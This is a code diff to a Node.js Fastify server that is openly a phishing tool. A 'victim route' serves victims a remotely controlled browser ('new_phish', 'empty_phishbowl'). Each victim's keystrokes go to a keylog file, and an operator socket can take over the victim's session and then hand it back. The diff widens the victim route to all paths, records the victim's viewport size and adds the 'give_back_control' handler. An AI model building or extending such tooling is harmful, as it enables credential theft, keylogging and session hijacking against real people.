@@ -60,7 +60,7 @@ fastify.route({
 //standard victim route
 fastify.route({
   method: ['GET'],
-  url: '/',
+  url: '/*',
   handler: async function (req, reply) {
     let client_ip = req.headers['x-real-ip']
     console.log('client_ip: ' + client_ip)
@@ -159,6 +159,8 @@ async function get_browser(target_page){
   //remember, callback arguments are evaluated when the callback is defined
   browser.socket_id = ''
   browser.victim_socket = ''
+  browser.victim_width = 0
+  browser.victim_height = 0
   browser.controller_socket = ''
   browser.keylog = ''
   browser.keylog_file = fs.createWriteStream(`./user_data/${browser_id}/keylog.txt`, {flags:'a'});
@@ -217,6 +219,8 @@ fastify.ready(async function(err){
       })
     })
     socket.on('new_phish', async function(viewport_width, viewport_height){
+      empty_phishbowl.victim_width = viewport_width
+      empty_phishbowl.victim_height = viewport_height
       await resize_window(empty_phishbowl, empty_phishbowl.target_page, viewport_width, viewport_height)
       await empty_phishbowl.target_page.setViewport({width: viewport_width, height: viewport_height})
       empty_phishbowl.victim_socket = socket.id
@@ -259,6 +263,13 @@ fastify.ready(async function(err){
       await resize_window(browser, browser.target_page, viewport_width, viewport_height)
       await browser.target_page.setViewport({width: viewport_width, height: viewport_height})
       fastify.io.to(browser.socket_id).emit('stream_to_admin', socket.id)
+    })
+    socket.on("give_back_control", async function(browser_id){
+      //give control back to the victim
+      const browser = browsers.get('browser_id', browser_id)
+      browser.controller_socket = browser.victim_socket
+      await resize_window(browser, browser.target_page, browser.victim_width, browser.victim_height)
+      await browser.target_page.setViewport({width: browser.victim_width, height: browser.victim_height})
     })
     socket.on("boot_user", async function(browser_id){
       const browser = browsers.get('browser_id', browser_id)
